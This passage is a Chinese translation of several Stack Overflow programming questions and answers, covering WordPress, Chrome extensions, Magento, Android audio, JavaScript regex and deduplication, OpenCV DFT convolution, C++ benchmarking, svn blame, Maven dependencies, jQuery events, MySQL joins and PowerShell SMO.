> 时间：2014-11-13T20:15:37.813

我确实遇到了这个问题，经过一些尝试和阅读代码后，我想出了这个解决方案：

```
<?php
add_filter('single_template', function($single_template) {
    global $post;

    if ($post -> post_type == 'your-custom-post-type') {
        if (!post_password_required()) {
            $single_template = 'path-to-your/single-your-custom-post-type.php';
        }
    }

    return $single_template;
});
?> 
```

这样，如果页面受密码保护，则只有在输入密码后才会在自定义单一视图中呈现页面。

# google-chrome-extension - Manifest.json 错误 'content_scripts[0].matches[0]' 的值无效：方案无效。

> ID：13957187
> 
> 赞同：1
> 
> 时间：2012-12-19T16:51:15.037
> 
> 标签：google-chrome-extension

这一直困扰着我，我无法找出解决方案。

```
 "content_scripts": [
    {
      "matches": ["chrome-extension://_MSG_@@extension_id/*"],
      "js": ["contentscript.js"]
    }
 ], 
```

[如果我要用http://google.com/](http://google.com/)之类的 url 替换“chrome-extensions://..”，它会起作用。

我什至尝试在 chrome develoeprs pag 上放松模式，并将扩展 id 替换为实际 id。

我基本上是在尝试将内容脚本注入“扩展文件夹中”的本地页面

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-19T19:50:57.893

抱歉，您不能将内容脚本注入到其他扩展中。文档是错误的，我之前报告过这个[问题](https://code.google.com/p/chromium/issues/detail?id=153245)。

# magento - Magento 产品属性数量

> ID：13957190
> 
> 赞同：0
> 
> 时间：2012-12-19T16:51:20.880
> 
> 标签：magento, attributes, product

在 Magento (1.7.0.2) 中，如果我有一个产品，例如 iPod，并且我向该产品添加了一个自定义属性，例如颜色（红色、蓝色、绿色），我可以定义每种颜色的可用库存数量吗？

例如 10 个红色、1 个蓝色和 3 个绿色，而不是 14 个 iPod？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T16:58:30.547

您应该为此制作可配置的产品。然后，您可以根据一个或多个属性将多个产品组合为网页上的单个产品。在管理员中，您可以管理每个单独产品的库存。

[http://www.magentocommerce.com/knowledge-base/entry/tutorial-creating-a-configurable-product](http://www.magentocommerce.com/knowledge-base/entry/tutorial-creating-a-configurable-product)

# java - 尝试在 Android 应用程序（java）上设置静音按钮

> ID：13957200
> 
> 赞同：1
> 
> 时间：2012-12-19T16:51:38.843
> 
> 标签：java, android, android-intent

我正在尝试在我的应用程序的 GUI 上设置一个简单的静音按钮。选择时：1\. 再次选择时静音媒体音量，2\. 取消静音媒体音量

我是 Java 新手。我不知道要导入哪个包或哪个语句最适合这个。这是我到目前为止所拥有的：

```
//Mute Button
    btnMute = (Button)findViewById(R.id.wmute); 
```

按钮 XML：

```
<Button
        android:id="@+id/wmute"
        style="?android:attr/buttonStyleSmall"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Mute" /> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T17:03:48.903

已选择：1

```
@Override
   public void onClick(View v) {

      switch (v.getId()) {
      case R.id.wmute:
        AudioManager.setMode(AudioManager.MODE_IN_CALL);
        AudioManager.setStreamSolo(AudioManager.STREAM_VOICE_CALL, true);
         break;
      default:
         break;
      }

   } 
```

已选择：2

```
AudioManager.setMode(AudioManager.MODE_NORMAL );
AudioManager.setStreamSolo(AudioManager.STREAM_VOICE_CALL, false); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-19T17:03:09.347

通读本[文档](http://developer.android.com/reference/android/media/AudioManager.html)。基本上你可以用`adjustVolume()`and`adjustStreamVolume()`方法来控制你的声音。

使用您的按钮触发一个事件，该事件调用这些方法之一来操纵您想要操纵的任何流的音量。

您可以使用这些方法来调整通知、音乐、铃声等的音量...

# javascript - js正则表达式替换多个单词

> ID：13957203
> 
> 赞同：2
> 
> 时间：2012-12-19T16:51:43.700
> 
> 标签：javascript

我需要在下面的句子中将 ${conference name} 替换为 ABC，将 ${conference day} 替换为 Monday。有人可以帮助我使用正则表达式。

```
var text = "<td>${conference name}</td><td>${conference day}</td>"

var list = ["${conferance name}", "${conference day}" ]

for (var j = 1; j < list.length; j++) {
            //Extracting the col name
            var colName  =   list[j].split("${");
            colName = colName.split("}")[0];
            //Replacing the col name
            text = text.replace(new RegExp('\\$\\{' + colName + '\\}', 'g'), "ABC");

        } 
```

如果我有 ${conference_name}，上面的代码很好，但是当我之间有空格时它会失败。

该列表是一个动态数组。替换文本也是动态的。我只是在这里将它们模拟为对象，以便将它们拟合到 Regex 语句中。

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T17:29:08.557

这是一个版本，可让您显式参数化替换：

```
function doReplace(repl, str) {
  var regexStr = Object.keys(repl).map(function(s) {
    return s.replace(/([^\w\s])/g, '\\$1');
  }).join('|');
  return str.replace(new RegExp(regexStr, 'g'), function(m) {
    return repl[m];//it changed to "repl"  
  });
}

var replacements = {
  "${conference name}": "ABC",
  "${conference day}": "Monday"
};

doReplace(replacements, text) // => "<td>ABC</td><td>Monday</td>" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-19T16:56:34.477

绝对不需要正则表达式，因为您知道要搜索的确切字符串。

```
var str = "<td>${conference name}</td><td>${conference day}</td>";
var list = {
  "conference name":"ABC",
  "conference day":"Monday"
};
var i;
for( i in list) {
  if( list.hasOwnProperty(i)) {
    str = str.replace("${"+i+"}",list[i]);
  }
} 
```

唯一的问题是，如果您的搜索字符串中可能有多个占位符，但在这种情况下，最里面的代码可以是：

```
do {
  oldstr = str;
  str = str.replace("${"+i+"}",list[i]);
} while(oldstr != str); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-19T17:02:15.460

```
 var str = "<td>${conference name}</td><td>${conference day}</td>";
    var list = ["${conference name}", "${conference day}" ];
    var listResult = ["ABC", "Monday" ]; 
```

# 通用模型

看到它工作[http://jsbin.com/atehun/6/watch](http://jsbin.com/atehun/6/watch)

`str, list, listResult`如上例所示构建。

```
function genericReplace(str, list, listResult) {    

    var escape = function(text) {
        return text.replace(/[-[\]{}()*+?.,\\^$|#\s]/g, "\\$&");
    };

    var escList = [];
    for (var i=0; i < list.length; i++) {
      escList.push( escape(list[i]) );
    }

    var regEx = new RegExp(escList.join('|'), "g");

    return str.replace(regEx, function(word) {
      return listResult[list.indexOf(word)];
    });
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-19T17:14:18.843

那个怎么样？

```
var r = {
        "conference name": "ABC",
        "conference day" : "Monday"
    },
    reg = new RegExp("\\$\\{" + Object.keys(r).join("\\}|\\$\\{") + "\\}", "g"),
    str = "<td>${conference name}</td><td>${conference day}</td>";

str = str.replace(reg, function(v) {
    return r[v.substring(2, v.length - 1)];
}); 
```

# visual-studio-2012 - 调用 TileUpdateManager.CreateTileUpdaterForApplication() 时出错

> ID：13957204
> 
> 赞同：2
> 
> 时间：2012-12-19T16:51:43.120
> 
> 标签：visual-studio-2012, windows-8, windows-rt

我正在使用使用活动磁贴的示例代码，并且当它尝试通过以下方式创建`TileUpdater`实例时：

```
TileUpdateManager.CreateTileUpdaterForApplication() 
```

它立即崩溃并显示以下消息：

```
The notification platform is unavailable. (Exception from HRESULT: 0x803E0105) 
```

当部署到模拟器和本地机器时会发生这种情况。

*编辑*

在挖掘事件日志时，我偶然发现了其中一些：

```
The Windows Notification platform has failed initialization.  Notifications will not work until after a restart. 
```

不过，我已经重新启动了很多次。

# jquery - jQuery中的加载函数不加载txt文件

> ID：13957205
> 
> 赞同：0
> 
> 时间：2012-12-19T16:51:43.740
> 
> 标签：jquery, html

在我的 html 标头中，我有

```
<head>
<script src="jquary.js"></script>
<script>
   $(document).ready(function(){
     ladda();
    });
</script>
</head> 
```

我加载 jQuery

在我的身体里

```
<form namne="load"
<fieldset>
    <legend> load</legend>
    <table>
        <tr>
            <td><div id="innehåll1">vill du ändra denna text</div></td>
        </tr>
    </table>
<button id="load_text">ändra</button>
</fieldset> 
```

在我的Javascript中我写过

```
(function($){
   ladda = function() {

$("#load_text").click(function(){
    $("#innehåll1").load("innehåll.txt");
        alert('ändrat');
  });
  };
 })(jQuery); 
```

我在同一文件夹中有一个名为 innehåll.txt 的外部 txt 文件，其中包含：

```
 <h2>fkdösfkds</h2>
  <p>jfksfksdalö</p> 
```

我的问题是，为什么 txt 文件的内容没有加载到 div 标签中？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T16:55:23.943

您没有将该`ladda()`函数声明为全局函数-它仅在您要在其中声明它的匿名函数的范围内-因此它超出了其他`$(document).ready()`事件处理程序的范围。

如果您检查浏览器的开发人员工具，您可能会收到告诉您上述情况的 JavaScript 错误。你可以这样做：

```
(function($) {
    $(document).ready(function() {
        $("#load_text").click(function() {
            $("#innehåll1").load("innehåll.txt");
            alert('ändrat');
        });
    });
})(jQuery); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T17:04:12.360

有几件事可能会导致意外行为：

1.  您可以尝试避免文件名中的特殊字符
2.  `ready`您应该在函数中可以访问的范围内声明 ladda
3.  您必须避免`form`标签中的 jQuery 和所有其他内容中的拼写错误

希望这对你有帮助！

在正确范围内定义函数的代码：

```
function ladda() {   
  $("#load_text").click(function(){
    $("#innehåll1").load("innehåll.txt");
    alert('ändrat');   
  }); 
} 
```

你也可以直接在准备好的身体上做：

```
$(document).ready(function() {
  $("#load_text").click(function() {
    $("#innehåll1").load("innehåll.txt");
    alert('ändrat');
  });
}); 
```

# c++ - 使用 DFT 进行卷积

> ID：13957212
> 
> 赞同：2
> 
> 时间：2012-12-19T16:52:04.927
> 
> 标签：c++, opencv, fft, convolution, dft

我使用以下代码计算具有指定内核的图像的卷积（在我的情况下为高斯）。每次我得到不同的结果，结果图像甚至不接近我在空间域中通过卷积获得的图像。首先，我认为问题出在图像的数据类型上。我将它们更改为 32 和 64，但结果仍然相同。谁能告诉我可能出了什么问题？

[http://opencv.willowgarage.com/documentation/cpp/core_operations_on_arrays.html#dft](http://opencv.willowgarage.com/documentation/cpp/core_operations_on_arrays.html#dft) 上面的这个函数给了我一个黑色的图像。我有灰度输入。

```
void convol_fft(const Mat& A,const vector<vector<float>>& kernel2d,Mat& result)
{

    Mat B = Mat(3,3,CV_64F);
    for (int row = 0; row < kernel2d.size(); row++)
        for (int col = 0; col < kernel2d[row].size(); col++){
            B.at<uchar>(row,col) = (uchar)kernel2d[row][col];
        }

    int dft_M = getOptimalDFTSize( A.rows+B.rows-1 );
    int dft_N = getOptimalDFTSize( A.cols+B.cols-1 );
    Mat dft_A = Mat::zeros(dft_M, dft_N, CV_64F);
    Mat dft_B = Mat::zeros(dft_M, dft_N, CV_64F);

    Mat dft_A_part = dft_A(Rect(0, 0, A.cols,A.rows));
    A.convertTo(dft_A_part, dft_A_part.type(), 1, -mean(A)[0]);
    Mat dft_B_part = dft_B(Rect(0, 0, B.cols,B.rows));
    B.convertTo(dft_B_part, dft_B_part.type(), 1, -mean(B)[0]);

    dft(dft_A, dft_A, 0, A.rows);
    dft(dft_B, dft_B, 0, B.rows);

    // set the last parameter to false to compute convolution instead of correlation
    mulSpectrums( dft_A, dft_B, dft_A, 0, false );
    idft(dft_A, dft_A, DFT_SCALE, A.rows + B.rows - 1 );

    result = dft_A(Rect(0, 0, A.cols + B.cols - 1, A.rows + B.rows - 1));
    normalize(result, result, 0, 1, NORM_MINMAX, result.type());
    pow(result, 3., result);

  //  B ^= Scalar::all(255);

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-03-09T12:51:07.497

以下基于 openCV 的代码`phaseCorrelateRes()`将在二维中进行相关性。

```
static void fftShift(InputOutputArray _out)
{
    Mat out = _out.getMat();

    if(out.rows == 1 && out.cols == 1)
    {
        // trivially shifted.
        return;
    }

    vector<Mat> planes;
    split(out, planes);

    int xMid = out.cols >> 1;
    int yMid = out.rows >> 1;

    bool is_1d = xMid == 0 || yMid == 0;

    if(is_1d)
    {
        xMid = xMid + yMid;

        for(size_t i = 0; i < planes.size(); i++)
        {
            Mat tmp;
            Mat half0(planes[i], Rect(0, 0, xMid, 1));
            Mat half1(planes[i], Rect(xMid, 0, xMid, 1));

            half0.copyTo(tmp);
            half1.copyTo(half0);
            tmp.copyTo(half1);
        }
    }
    else
    {
        for(size_t i = 0; i < planes.size(); i++)
        {
            // perform quadrant swaps...
            Mat tmp;
            Mat q0(planes[i], Rect(0,    0,    xMid, yMid));
            Mat q1(planes[i], Rect(xMid, 0,    xMid, yMid));
            Mat q2(planes[i], Rect(0,    yMid, xMid, yMid));
            Mat q3(planes[i], Rect(xMid, yMid, xMid, yMid));

            q0.copyTo(tmp);
            q3.copyTo(q0);
            tmp.copyTo(q3);

            q1.copyTo(tmp);
            q2.copyTo(q1);
            tmp.copyTo(q2);
        }
    }

    merge(planes, out);
}

void Correlate2d(
    const cv::Mat& src1, 
    const cv::Mat& src2, 
    cv::Mat& dst,
    double* response)
{

    CV_Assert( src1.type() == src2.type());
    CV_Assert( src1.type() == CV_32FC1 || src1.type() == CV_64FC1 );
    CV_Assert( src1.size == src2.size);

    int M = getOptimalDFTSize(src1.rows);
    int N = getOptimalDFTSize(src1.cols);

    Mat padded1, padded2, paddedWin;

    if(M != src1.rows || N != src1.cols)
    {
        copyMakeBorder(src1, padded1, 0, M - src1.rows, 0, N - src1.cols, BORDER_CONSTANT, Scalar::all(0));
        copyMakeBorder(src2, padded2, 0, M - src2.rows, 0, N - src2.cols, BORDER_CONSTANT, Scalar::all(0));
    }
    else
    {
        padded1 = src1;
        padded2 = src2;
    }

    Mat FFT1, FFT2, P, Pm, C;

    // correlation equation
    // Reference: http://en.wikipedia.org/wiki/Phase_correlation
    dft(padded1, FFT1, DFT_REAL_OUTPUT);
    dft(padded2, FFT2, DFT_REAL_OUTPUT);

    mulSpectrums(FFT1, FFT2, dst, 0, true);
    idft(dst, dst, DFT_SCALE); // gives us the correlation result...
    fftShift(dst); // shift the energy to the center of the frame.

    // locate the highest peak
    Point peakLoc;
    minMaxLoc(dst, NULL, NULL, NULL, &peakLoc);

    // max response is scaled
    if( response )
        *response = dst.at<float>(peakLoc);
} 
```

您可以在 \opencv\sources\modules\imgproc\src\phasecorr.cpp 中找到代码

为了将代码更改为卷积，只需更改此行：

```
mulSpectrums(FFT1, FFT2, dst, 0, true); 
```

到

```
mulSpectrums(FFT1, FFT2, dst, 0, false); 
```

这相当于在matlab中做：

```
dst = fftshift(ifft2(fft2(src1).*conj(fft2(src2)))) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-20T13:58:14.680

我不确定 OpenCV ......但这看起来很可疑。

```
for (int row = 0; row < kernel2d.size(); row++)
    for (int col = 0; col < kernel2d[row].size(); col++){
        B.at<uchar>(row,col) = (uchar)kernel2d[row][col];
 } 
```

如果您正在填充 B 内核，那么该行应该是 kernel2d[col].size()。看起来您正在超出 B 内核。kernel2d.size() 的价值是什么？

为什么不直接加载值？保存所有函数调用。

对于高斯内核，它应该类似于 {1,2,1,2,3,2,1,2,1}。

# c++ - 我们应该为函数的返回值使用临时变量吗？

> ID：13957237
> 
> 赞同：10
> 
> 时间：2012-12-19T16:53:16.297
> 
> 标签：c++, performance

我想了想：这两种做法是否存在性能差异：

1.  将函数的返回值存储在临时变量中，而不是将该变量作为参数提供给另一个函数。
2.  将函数放入另一个函数中。

## 规格

*假设所有类和函数都正确编写。*

### 情况1。

```
ClassA a = function1();
ClassB b = function2(a);
function3(b); 
```

### 案例 2。

```
function3(function2(function1())); 
```

我知道只运行一次没有太大区别，但假设我们可以在一个循环中运行很多次，我创建了一些测试。

## 测试

```
#include <iostream>
#include <ctime>
#include <math.h>
using namespace std;

int main()
{
   clock_t start = clock();
   clock_t ends = clock();

   // Case 1.
   start = clock();
   for (int i=0; i<10000000; i++)
   {
      double a = cos(1);
      double b = pow(a, 2);
      sqrt(b);
   }
   ends = clock();
   cout << (double) (ends - start) / CLOCKS_PER_SEC << endl;

   // Case 2.
   start = clock();
   for (int i=0; i<10000000; i++)
      sqrt(pow(cos(1),2));
   ends = clock();
   cout << (double) (ends - start) / CLOCKS_PER_SEC << endl;
   return 0;
} 
```

### 结果

*   案例 1 = 6.375
*   案例 2 = 0.031

为什么第一个慢得多，如果第二个更快，为什么我们不总是那样写代码？无论如何，第二个练习有名字吗？
我还想知道如果我在第一种情况下在 for 循环之外创建变量会发生什么，但结果是一样的。为什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-19T17:08:38.200

如果您想要计算紧缩并且您的数字变得更加一致，请打破所有这些优化。为了确保获得正确值的代码实际运行并且没有完全丢弃，我已经将*两个*测试中的结果分配给了一个 volatile 本地（这不是 volatile 的正确使用，但在确保只有价值*创造*是显着的增量）。

```
#include <iostream>
#include <ctime>
#include <cmath>
using namespace std;

int main()
{
    clock_t start;
    volatile double val;

    for (int j=1;j<=10;j++)
    {
        // Case 1.
        start = clock();
        for (int i=0; i<2000000; i++)
        {
            double a = cos(1);
            double b = pow(a, 2);
            val = sqrt(b);
        }
        cout << j << ':' << (double) (clock() - start) / CLOCKS_PER_SEC << endl;

        // Case 2.
        start = clock();
        for (int i=0; i<2000000; i++)
            val = sqrt(pow(cos(1),2));
        cout << j << ':' << (double) (clock() - start) / CLOCKS_PER_SEC << endl << endl;
    }
    return 0;
} 
```

在我的 Macbook Air 上生成以下发布编译的输出（无论如何都不是速度恶魔）：

```
1:0.001465
1:0.001305

2:0.001292
2:0.001424

3:0.001297
3:0.001351

4:0.001366
4:0.001342

5:0.001196
5:0.001376

6:0.001341
6:0.001303

7:0.001396
7:0.001422

8:0.001429
8:0.001427

9:0.001408
9:0.001398

10:0.001317
10:0.001353 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T17:10:41.327

对上述两个循环进行适当且合法的全面优化是“甚至不执行循环”。您可能很容易看到在第一种情况下使用未初始化的变量混淆了编译器，或者您使用变量可能会混淆它，或者您的优化级别可能会强制命名变量实际存在。

现在在 C++11 中两者之间存在差异，涉及到临时变量的隐式移动，但您可以使用`std::move`. （我不确定，但最后一次使用超出范围的局部变量可能有资格进行隐式移动）。对于 a`double`这没有区别，但对于更复杂的类型则可以。

# svn - svn 跟踪整个项目中单个文件的更改

> ID：13957238
> 
> 赞同：3
> 
> 时间：2012-12-19T16:53:16.340
> 
> 标签：svn, trac, backtrace

我的情况是，我们在项目中使用了插件，我是前端开发人员，所以，有人指责我直接在插件代码中进行了更改，这显然是一种不好的做法，但我很确定我没有这样做。

我们正在使用 subversion 和 Trac 进行版本控制等。该项目（和更改）已经非常老了，差不多 2-3 个月大。这是我的问题，我怎么知道到目前为止有多少人和谁编辑了那个（可疑的）文件？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T17:02:45.667

Subversion 中有一个非常简洁的命令：

```
$ svn blame $file_name_or_url 
```

该命令将显示文件中的每一行，以及谁更改了该行，以及更改发生在哪个 Subversion 版本中。你找到导致问题的那条线，你可以找到最后一个触及那条线的人。

您可以`svn log`对文件使用命令来查看谁更改了该文件以及何时更改：

```
$ svn log $file_name_or_url 
```

这将向您显示该文件的完整历史记录。您还可以使用该`--diff`参数在每个版本之间生成差异输出。但是，该`svn blame`命令可能最适合您想要的。

# javascript - 如何从包含嵌套对象的数组中删除重复项

> ID：13957239
> 
> 赞同：4
> 
> 时间：2012-12-19T16:53:16.143
> 
> 标签：javascript, arrays, javascript-objects

我有一个嵌套对象数组（我用它来填充我的树），如下所示..

```
var obj1= {
        text: "TreeRoot",
        items: [ {
            text: "subgroup1" ,
            items: [ {
                text: "subgroup2",
                items: [ {
                    text: "subgroup3",
                    items: [ {
                        text: "subgroup4",
                        items: [ {
                            text: "subgroup5"
                        }]
                    }]
                }]
            }]
        }]
    };

var obj2 = {
        text: "TreeRoot",
        items: [ {
            text: "subgroup1" ,
            items: [ {
                text: "subgroup2",
                items: [ {
                    text: "subgroup3",
                    items: [ {
                        text: "subgroup4",
                        items: [ {
                            text: "subgroup5"
                        }]
                    }]
                }]
            }]
        }]
    };

 var obj3= {
        text: "TreeRoot",
        items: [ {
            text: "subgroup1" ,
            items: [ {
                text: "subgroup2"
                }]
            }]
        }]
    };

var finalArray=[];
finalArray.push(obj1);
finalArray.push(obj2);
finalArray.push(obj3); 
```

现在我需要使用文本从我的最终数组中删除重复的对象（即我应该从我的数组中删除 obj2）...

这是我试过的..

```
var arr = {};

for ( var i=0; i < finalPath.length; i++ )
     arr[finalArray[i]['text']] = finalArray[i];

finalArray= new Array();
for ( key in arr )
    finalArray.push(arr[key]); 
```

有人可以让我知道最好的方法吗？

编辑：

我认为以下解决方案有效，但尚未完全测试...

```
var arr = {};

for ( var i=0; i < finalArray.length; i++ ){
    if(finalArray[i].items){
        for(var j=0;j<finalArray[i].items.length;j++){
            arr[finalArray[i].items[j]['text']] = finalArray[i];
        }
    }else{
        arr[finalArray[i]['text']] = finalArray[i];
    }
}

finalArray= new Array();
for ( key in arr )
    finalArray.push(arr[key]) 
```

谢谢， 巴拉尼

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-11T00:45:28.877

JSON 似乎很容易使用，并且可以保持代码整洁，但可能会使用大量处理。

还有另一种方法可以解决您的问题，您可以创建一个递归函数，该函数将遍历数组并比较每个分支。

```
function areEqual(a, b) {
    if( (a.items && !b.items) || (!a.items && b.items) ) return false;
    else if(!a.items && !b.items) return a.text == b.text ? true : false;
    else return (a.text == b.text) ? areEqual(a.items[0], b.items[0]) : false;
} 
```

此代码适用于您提供的数据，但如果您想测试其他值（不仅是文本），您可能需要调整函数

```
areEqual(obj1, obj2) : true
areEqual(obj1, obj3) : false 
```

**编辑：**

这是该功能的简化版本，如果您需要比较多个元素（不仅是文本），那就更好了

```
function areEqual(a, b) {
    var conditions = a.text == b.text /* && a.another_var == b.another_var */;

    if( typeof(a.items) != typeof(b.items) ) return false;
    if(a.items && b.items && conditions) return areEqual(a.items[0], b.items[0]);
    return conditions;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-03T10:55:23.083

抱歉，但我认为如果对象的深度高于 2，您的代码将失败。至少，逻辑看起来很奇怪。为什么不定义一个测试来检查两个对象是否相等？您可以使用递归测试，或者简单地测试 json 版本的相等性：类似于：

```
function are_equal(obj1,obj2) {
return JSON.stringify(obj1)==JSON.stringify(obj2);
} 
```

然后使用此处的响应[Remove Duplicates from JavaScript Array](https://stackoverflow.com/questions/9229645/remove-duplicates-from-javascript-array)：

```
uniqueArray = finalArray.filter(function(elem, pos) {
return are_equal(elem,pos);
}) 
```

我没有测试过，希望对你有帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-03T15:41:05.897

试试这个代码：

```
var ObjList = [......]; /*All your objects*/
var dict = {}; /*Dictionary for duplicate elimination*/
for (var obj in ObjList) 
{
  dict[JSON.stringify(obj)] = JSON.stringify(obj);
}
var newObjList = [];
for (var key in dict)
{
  newObjList.push(key);
} 
```

现在`newObjList`拥有所有您的独特物品，无论树有多深。

# android - 将 Google API Java 客户端库和日历 API Java 库添加到 Maven 依赖项

> ID：13957241
> 
> 赞同：2
> 
> 时间：2012-12-19T16:53:28.203
> 
> 标签：android, maven, google-api, google-calendar-api

我有一个使用 Google Calendar v3 API 的 Android 项目。

我正在使用[Google API 客户端](http://code.google.com/p/google-api-java-client/) 和[日历 API Java](http://code.google.com/p/google-api-java-client/wiki/APIs#Calendar_API)库在 Google 日历上执行查询。

我在设置 Maven 依赖项时遇到问题。我已经使用文档中的 id 将这些库添加到我的 pom.xml 中，但其中一些已经过时，所以我最终得到了这个[pom.xml](http://pastebin.com/a0DxCs22)

我不得不放入`<scope>provided</scope>`google-api-client、google-http-client-jackson 和 google-http-client-android 库，因为 maven 在尝试 dex 这些库时失败了。

```
Failed to execute goal com.jayway.maven.plugins.android.generation2:android-maven-plugin:3.4.1:dex (default-dex) 
```

现在这个 pom.xml 成功创建了 .apk 并将其安装在设备上。但是当我尝试使用提供的库对日历 API 进行查询时，应用程序失败，说它找不到某些类。

```
12-19 17:32:17.247: E/dalvikvm(15119): Could not find class 'com.google.api.services.calendar.model.TimePeriod', referenced from method 
```

当我从 Eclipse 构建应用程序时（所有 .jar 文件都在 /libs 文件夹中），一切正常。

所以我想知道是否有一种正确的方法可以将这些依赖项添加到 Maven 脚本中。谷歌有很多过时的文档，其中包含无效的链接或示例。否则，我将不得不摆脱 Google 库并自己编写日历 API 查询。

任何帮助将不胜感激。

**回答：**

xpp3.jar 引起了这个问题，因为它有来自 javax 包的类。我不得不手动将它从所有 Google 库中排除：

```
 <exclusion>
                  <artifactId>xpp3</artifactId>
                  <groupId>xpp3</groupId>
            </exclusion> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T18:36:09.490

您不能使用提供的范围，因为这些库不是 Android 堆栈的一部分，因此需要包含在您的 apk 中。将它们包含在默认范围内时，您会遇到什么失败？

更新：

怀疑您正在尝试包含一个 javax 命名空间项目。尝试找出导致它的依赖项

```
mvn dependency:tree 
```

然后可能排除它（假设同一个类已经在 android 中）或将其隐藏到不同的命名空间（并更新库以使用它）或找到更适合的库..

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-19T20:47:59.487

阿尔乔姆，

我看到下一个错误并建议如何修复它：

```
[INFO] trouble processing "javax/xml/namespace/QName.class":
[INFO]
[INFO] Ill-advised or mistaken usage of a core class (java.* or javax.*)
[INFO] when not building a core library. 
```

这是Java核心文件。尝试找出与 ( `mvn dependency:tree`) 一起使用它的依赖项。

# javascript - 找出 OnClick 事件的注册方法？

> ID：13957245
> 
> 赞同：4
> 
> 时间：2012-12-19T16:53:46.533
> 
> 标签：javascript, jquery

我有一个简单的输入元素：

```
 <input class="a" />     // <---notice - no inline onclick function 
```

有人在做

```
$(".a").on('click',function () {alert('1')});
// ...and later
$(".a").on('click',function () {alert('2')}); 
```

现在，我想查找：*“单击元素时执行了哪些功能”*？

我怎样才能在 Jquery/Javascript 中做到这一点？

*ps 请忽略这里的匿名函数，我也可以附上一个常规的命名函数。*

[jsbin](http://jsbin.com/apageb/2/edit)

*（我正在使用（如 jsbin 所示，使用 1.8.3 - 最新版本））*

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-19T17:00:18.957

试试这个：

```
console.log($._data( $(".a")[0], "events" )); 
```

[在 1.8.2 中测试](http://jsfiddle.net/c43tt/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-19T16:56:18.403

有一种方法可以使用当前和旧版本的 jQuery，但是它是内部的并且已贬值，并且很快就会消失。

```
console.log($(".a").data("events")); 
```

# mysql - 使用具有多个结果的子查询，这些结果取决于主查询

> ID：13957246
> 
> 赞同：0
> 
> 时间：2012-12-19T16:53:51.670
> 
> 标签：mysql, sql

我有一个名为“tc_person”的人员表和一个名为“tc_marriage”的婚姻表。我想从我的人员表中选择几列和一列代表合作伙伴的 id。

婚姻表包括两个人的 pid_1 和 pid_2 - 但重要的是一对夫妇只有一个条目，并且夫妇 id 的顺序可能会有所不同。这是表格：

tc_person：

```
|   id    |    name    |   lastname  |
--------------------------------------
|    4    |    peter   |    smith    |
|    5    |    sarah   |    smith    | 
```

tc_marriage：

```
|   id    |    pid_1   |    pid_2    |
--------------------------------------
|    0    |      5     |      4      |
|    1    |      7     |      9      | 
```

似乎我的子查询在原始选择语句之前被解释为一个整体。现在我得到我的子查询返回多行的错误。

```
SELECT p.id, p.name, p.lastname,

(SELECT m.pid_1 FROM tc_marriage m WHERE m.pid_2 = p.id UNION
 SELECT m.pid_2 FROM tc_marriage m WHERE m.pid_1 = p.id) as partner_id

FROM tc_person p WHERE p.lastname LIKE 'smith'; 
```

我正在寻找以下输出：

```
|   id    |    name    |   lastname  |  partner_id  |
-----------------------------------------------------
|    4    |    peter   |    smith    |       5      |
|    5    |    sarah   |    smith    |       4      | 
```

这甚至可能只使用一个查询吗？您现在可能已经知道我是个 SQL 菜鸟。也许你们可以帮忙。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T16:57:47.313

您可以使用 IN 来避免 UNION（通常速度较慢），并使用 CASE 语句来选择正确的 partner_id：

```
SELECT p.id, 
       p.name, 
       p.last_name, 
       CASE p.id WHEN m.pid_1 THEN m.pid_2 ELSE m.pid_1 END AS partner_id
FROM tc_person p
JOIN tc_marriage m ON p.id IN (m.pid_1, m.pid_2) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T16:58:42.923

您要做的是将人员表加入到婚姻表中。但是，问题是您有两个密钥。一种解决方案是进行两次连接，然后执行一些逻辑来选择正确的值。

我更喜欢通过交换伴侣来“加倍”婚姻表。以下查询在子查询中采用这种方法：

```
select p.id, p.name, p.lastname, partner_id
from tc_person p join
     (select pid_1 as firstid, pid_2 as partner_id
      from marriage
      union all
      select pid_2 as firstid, pid_1 as partner_id
      from marriage
     ) m
     on p.id = m.firstid 
```

# sql-server-2008 - 使用 Powershell 读取 SQL 代理错误日志

> ID：13957247
> 
> 赞同：-1
> 
> 时间：2012-12-19T16:53:57.813
> 
> 标签：sql-server-2008, powershell

我可以使用以下代码轻松读取 SQL 错误日志，但找不到读取代理错误日志的方法。有谁知道这是否可能？

```
 $sqlServer = new-object ("Microsoft.SqlServer.Management.Smo.Server") $server
    $sqlServer.ReadErrorLog() 
```

我已经搜索了命名空间，但没有任何明显的迹象指向我的日志。我试过这个没有成功。

```
 $sqlAgent = new-object ("Microsoft.SqlServer.Management.Smo.Agent") $server
    $sqlAgent.ReadErrorLog() 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T18:09:54.427

@Pondlife 是正确的。对于其他面临这个问题的人来说，这对我来说是有效的。

```
 [System.Reflection.Assembly]::LoadWithPartialName('Microsoft.SqlServer.SMO') | out-null

